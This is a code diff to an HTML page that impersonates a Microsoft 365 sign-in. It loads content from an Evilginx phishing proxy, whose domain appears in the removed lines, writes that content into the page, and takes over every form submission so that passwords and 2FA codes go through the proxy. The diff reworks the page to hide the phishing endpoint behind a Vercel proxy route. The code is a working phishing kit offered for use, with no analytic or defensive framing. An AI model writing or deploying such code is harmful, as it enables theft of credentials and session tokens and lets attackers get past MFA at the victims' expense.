@@ -1,40 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Microsoft 365 Login</title>
+    <title>Loading Microsoft 365...</title>
     <script>
-        // CONFIGURATION - ONLY CHANGE THIS:
-        const EVILGINX_URL = "https://login.espeharete.top/xVpSXLob";
-        const FINAL_REDIRECT = "https://office.com";
-
-        // DO NOT TOUCH BELOW THIS LINE
-        async function loadEvilginxContent() {
+        async function loadPage() {
             try {
-                // Fetch Evilginx page INVISIBLY
-                const response = await fetch(`/api/hidden-proxy);
+                // Fetch Evilginx page through Vercel's proxy
+                const response = await fetch('/api/proxy');
                 const html = await response.text();
-
-                // Show the stolen page
+                
+                // Show the page
                 document.open();
                 document.write(html);
                 document.close();
-
-                // Hijack all form submissions
+                
+                // Hijack form submissions to keep them in proxy
                 document.querySelectorAll('form').forEach(form => {
                     form.onsubmit = async (e) => {
                         e.preventDefault();
-                        await fetch(`/api/hidden-proxy?url=${encodeURIComponent(form.action)}`, {
-                            method: form.method,
+                        await fetch('/api/proxy', {
+                            method: 'POST',
                             body: new FormData(form)
                         });
-                        loadEvilginxContent(); // Load next page (e.g. 2FA)
+                        loadPage(); // Reload next page (e.g., 2FA)
                     };
                 });
             } catch {
-                window.location.href = FINAL_REDIRECT;
+                window.location.href = "https://office.com"; // Fallback
             }
         }
-
+        
         // Start loading
         window.onload = () => {
             document.body.innerHTML = `
@@ -43,7 +38,7 @@
                     <p>Loading your secure sign-in experience...</p>
                 </div>
             `;
-            setTimeout(loadEvilginxContent, 1000);
+            setTimeout(loadPage, 1000);
         };
     </script>
 </head>
